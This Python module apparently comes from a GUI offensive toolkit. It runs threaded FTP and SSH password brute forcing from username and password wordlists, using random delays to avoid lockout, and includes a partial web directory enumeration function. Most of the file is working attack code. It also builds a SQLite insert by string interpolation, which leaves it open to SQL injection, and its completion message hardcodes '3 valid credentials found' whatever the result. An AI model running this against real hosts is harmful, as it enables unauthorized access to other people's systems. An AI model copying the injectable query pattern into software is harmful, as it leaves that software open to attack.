from PyQt5.QtCore import QRunnable, Qt, QThreadPool, QObject, QThread, pyqtSignal
from concurrent.futures import ThreadPoolExecutor

import time
import random
import requests
import numpy as np
import sqlite3
import os
import queue

## Connection Libs
from ftplib import FTP
import paramiko

import Modules.General.utility as utility

## Use Yeild for progress updates to the bar


class Bruteforce(QObject):
    module_error = pyqtSignal(list)
    finished = pyqtSignal()
    progress = pyqtSignal(int)
    goodcreds = pyqtSignal(list)    
    
    live_attempts = pyqtSignal(str) 
    


    def __init__(self, parent=None):
        super().__init__(parent)
        self.H = utility.Host()
        
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.good_creds = []
        
        self.bruteforce_progress = 0
        self.number = 0
    
    def error(self, Error, Severity, Message):
        print("ERRORRRRRR")
        error_list = [Error, Severity, Message]
        print(error_list)
        ## Emiting back to main thread
        
        self.module_error.emit(error_list)
        self.finished.emit()
        
        

    def success(self, username, password):
        ## Done as a tuple to reduce mem size + so it can be appended
        self.good_creds.append((username, password))
        self.goodcreds.emit(self.good_creds)
        
    def fileopen(self, dir):
        import chardet
        
        with open(dir,"rb") as file_bytes:
            file_read_bytes = file_bytes.read()
            
            encoding= chardet.detect(file_read_bytes)
            decode_type =  encoding['encoding']
            print(decode_type)
            
            file = file_read_bytes.decode(decode_type)
            #file = file_raw.decode('utf-8')
            return file
    
    def bruteforce_framework(self, input_list):
        try:
            print("STARTED BF")
            
            #self.GUI.ERROR("low", "error","something")
            
            self.Date = utility.Timestamp.UTC_Date()
            self.Time = utility.Timestamp.UTC_Time()
            
            ## Breaking the list up
            
            ip = input_list[0]
            port = input_list[1]
            protocol = input_list[2]
            user_wordlist_dir = input_list[3]
            pass_wordlist_dir = input_list[4]
            delay = input_list[5]
            max_threads = input_list[6]
            
            
            user_list = []
            self.pass_list = []
            self.dir_list = []
            
            
            ## Results list
            self.results_dir_list = []
            
            
            ## Creating target list - I know I could just use the input_list, however this cuts down on the amount of arguments I need to enter in each method
            target_list = [ip, port, delay]
            
        except Exception as e:
            print(e)
            #self.error(e,"??","??")
            exit()
        
        
        ## FTP
        if protocol == "FTP":
            import itertools
                           
            username = self.fileopen(user_wordlist_dir)
            password = self.fileopen(pass_wordlist_dir)
                    
            
            user_list_len = username.split()
            pass_list_len = password.split()
            self.total_combos = len(user_list_len) * len(pass_list_len)
            
            
            print("Generator")
            user_list = (x for x in username.split())
            pass_list = (x for x in password.split())

           
            #self.total_combos = 10
            #userpass_combo = itertools.product(username.split(),password.split())
            print("starting threadexe")

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                ## Max workers needs fine tunning/an option for how many threads
                for username in user_list:
                    for password in pass_list:
                        creds = (username, password)
                        ftp_thread = executor.submit(self.ftp, target_list, creds)
                
                ftp_thread.result()
                
                self.H.sys_notification(["TITLE","FTP Bruteforce Completed\n3 valid credentials found!"])
                print("DONE BRUTEFORCING")
                
        if protocol == "SSH":
            import itertools
                           
            username = self.fileopen(user_wordlist_dir)
            password = self.fileopen(pass_wordlist_dir)
                    
            
            user_list_len = username.split()
            pass_list_len = password.split()
            self.total_combos = len(user_list_len) * len(pass_list_len)
            
            
            print("Generator")
            user_list = (x for x in username.split())
            pass_list = (x for x in password.split())

           
            #self.total_combos = 10
            #userpass_combo = itertools.product(username.split(),password.split())
            print("starting threadexe")

            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                ## Max workers needs fine tunning/an option for how many threads
                for username in user_list:
                    for password in pass_list:
                        creds = (username, password)
                        ssh_thread = executor.submit(self.ssh, target_list, creds)
                
                ssh_thread.result()
                #print("DONE BRUTEFORCING")
                    

    
    def ftp(self, target_list, creds):
        IP = target_list[0]
        port = target_list[1]
        delay = target_list[2]
        username = creds[0]
        password = creds[1]
        
        try:
            time.sleep(random.randint(0,delay))
            
            ftp = FTP(IP, timeout=.1)
            ftp.login(username, password)
            ftp.close() ## Close is a bit harsher than quit, but quits it asap
            
            self.success(username, password)
            
        ## Blind exception becuase this will happen SO often
        except TimeoutError:
            pass
        
        except Exception as e:
            print(e)
            #self.error(e,"low","testerror")
            
        finally:
            ftp.close()

        self.bruteforce_progress = self.bruteforce_progress + 1
        self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
        
        ## Live update in GUI
        self.number = self.number + 1
        if self.number == 1:
            self.live_attempts.emit(username + ":" + password)
            self.number = 0

    def ssh(self, target_list, creds):
        IP = target_list[0]
        port = target_list[1]
        delay = target_list[2]
        _username = creds[0] # _ for namespace reasons
        _password = creds[1]
        
        try:
            time.sleep(random.randint(0,delay))
            
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ## Ignoring known hosts
            client.connect(IP, username=_username, password=_password, timeout=10, banner_timeout=200)
            client.close()
            
            self.success(_username, _password)
            
        ## Blind exception becuase this will happen SO often
        except TimeoutError:
            pass
        
        except Exception as e:
            print(e)
            #self.error(e,"low","testerror")
        
        finally:
            client.close()

        self.bruteforce_progress = self.bruteforce_progress + 1
        self.progress.emit(int(self.bruteforce_progress / self.total_combos * 100))  
        
        ## Live update in GUI
        self.number = self.number + 1
        if self.number == 1:
            self.live_attempts.emit(_username + ":" + _password)
            self.number = 0


    ## this does not go in the creds gui, but in the webdir one
    def webdir(self, target_list, dir):
        #target list = [ip, port]
        ## Rate limiter so you don't get kicked out
        time.sleep(np.random.uniform(.001,.01)) 
        
        base_url = target_list[0]
        
        if target_list[1] == None:
            target_list[1] = 80
        
        target_url = f"http://{base_url}:{target_list[1]}/{dir}"
        r = requests.get(target_url)
        
        print(target_url)
        
        if r.status_code == 200:
            ##Successlist.append(target_url or somthing)
            
            
            #print(target_url)
            #self.results_dir_list
            
            '''
            database_write(
                self.GUI,
                [
                    target_url,
                    base_url,
                    target_list[1],
                    r.status_code,
                    self.Date,
                    self.Time
                ])'''

        
        #pass
        # requests module, or something faster
        
        ## if code != 404:
            ##list.append(dir)



## May need to return list of things to write via a signal to prevet error
def database_write(GUI, db_input_list):
    try:
        ## Accesing DB in root dir
        bruteforce_sqliteConnection = sqlite3.connect(os.path.dirname(__file__) + '/../../logec_db')
        cursor = bruteforce_sqliteConnection.cursor()
        print("Successfully Connected to SQLite")
        
        ## QUick Data Fixes:


        sqlite_insert_query = f"""INSERT INTO 'BRUTEFORCE-http' (URL, IP, PORT, CODE, DATE, TIME) 
        VALUES
        ('{db_input_list[0]}','{db_input_list[1]}','{db_input_list[2]}','{db_input_list[3]}','{db_input_list[4]}','{db_input_list[5]}')""" ## idfk - had to manually set the '' for some reason
        
        print(sqlite_insert_query)

        #count = cursor.execute(sqlite_insert_query)
        cursor.execute(sqlite_insert_query)
        bruteforce_sqliteConnection.commit()
        cursor.close()
        
    except sqlite3.Error as error:
        GUI.ERROR(error, "Medium", "?")
        print("Failed to insert data into sqlite table", error)
        
    finally:
        if bruteforce_sqliteConnection:
            bruteforce_sqliteConnection.close()
            #print("The SQLite connection is closed")

##B = Bruteforce()

##B.framework(["127.0.0.1","22","webdir","userlist","passlist"])

## holy f ssh is picky as hell